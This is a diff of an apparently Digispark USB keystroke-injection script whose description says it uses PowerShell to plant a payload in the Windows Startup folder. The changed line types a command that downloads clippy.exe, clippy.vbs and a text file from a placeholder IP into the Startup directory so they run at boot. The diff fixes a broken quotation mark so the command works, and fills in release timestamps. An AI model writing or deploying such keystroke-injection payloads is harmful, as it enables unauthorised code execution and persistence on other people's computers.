@@ -14,9 +14,9 @@ Decsription: Uses powershell to download payload in "startup" folder as to load 
 
 Created by Tyler Smith on 9/2/2019 at [TIME] - http://DataDucks.3utilities.com/forum (Forums) - DataDucks.Web.Development@gmail.com
 
-Tested and Refined by Tyler Smith on 9/8/2019 at [TIME]
+Tested and Refined by Tyler Smith on 9/8/2019 at [10:42 AM]
 
-Final Build on 9/8/2019 at 1:12 AM - Web Release on 9/8/2019 at [TIME]
+Final Build on 9/8/2019 at 1:12 AM - Web Release on 9/8/2019 at [10:43 AM]
 
 Please see "clippy.txt" for list of phrases.
 
@@ -49,7 +49,7 @@ Please see "clippy.txt" for list of phrases.
       DigiKeyboard.println(F("Y")); // Accept
       DigiKeyboard.delay(100);
       // Execute code from the interwebs modify 000.0.0.0 with your IP address (192.168.0.0, 127.0.0.1, etc.)
-      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\""));
+      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \"clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\""));
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
